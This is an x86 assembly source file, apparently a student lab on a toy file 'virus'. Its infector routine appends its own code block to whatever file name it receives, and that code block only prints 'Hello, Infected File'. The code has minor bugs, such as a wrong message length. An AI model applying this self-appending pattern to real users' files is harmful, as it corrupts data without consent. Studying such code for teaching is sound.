
%define O_APPEND    0x400
%define O_WRONLY    0x1



 section .data 
    s: db 'Hello, Infected File',10, 0 
    error: db 'you have an error in your program !', 10, 0

section .text
global _start
global system_call
global infector
extern main



_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        - number of system call
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


infection :
code_start:  
    push    ebp             ; Save caller state
    mov     ebp, esp
    push 21
    push dword s
    push dword 1
    push dword 4
    call system_call
    add     esp, 16
    pop     ebp             ; Restore caller state
    ret     



infector:               ; receives a file name and infect it with the virus code written in infected function
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; pushes all registers to stack to save their state

    ;open system call in append mode (no need to use seek)
    
    mov eax, 5
    mov ebx, [ebp+8]        ; get the file name (char*) arguments 
    mov ecx, O_APPEND         ; set the O_APPEND flag in ECX using bitwise OR
    or ecx, O_WRONLY
    int 0x80                ; calling open system call with APPEND mode on the char* placed in [ebp+8] which is the argument for this function, FD is now stored in eax
    cmp eax, -1             ; check whether the file opened 
    je handle_error         ; jumps to the handle_error code if failed to open the file 

    ;write system call 
    mov ebx, eax       ; moving the file descriptor from eax to ecx, FD Is now stored in ebx 
    pushad
    mov eax, 4      ; write system call
    mov edx, code_end - code_start  ; length of payload
    mov ecx, code_start ; address of payload
    int 0x80            ; calling the write system call to edit the file with the executable code 
    popad
    
    ;close system call
    mov eax, 6 ;number of close system call, FD is already stored in ebx
    int 0x80

    ;restore registers state and returns 
    popad                   ; pops all registers from stack to restore their previous state (before the function was called)
    pop     ebp             ; Restore caller state
    ret  

handle_error: 
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad   
    mov eax, 4
    mov ebx, 1
    mov ecx, dword error
    mov edx, 22
    int 0x80
    mov     eax,1           ; calling the exit system call 
    int     0x80

    ; in case that I do not wish to terminate the program, I should restore the registers state : 
    popad                   ; pops all registers from stack to restore their previous state (before the function was called)
    pop     ebp             ; Restore caller state
    ret  

code_end:
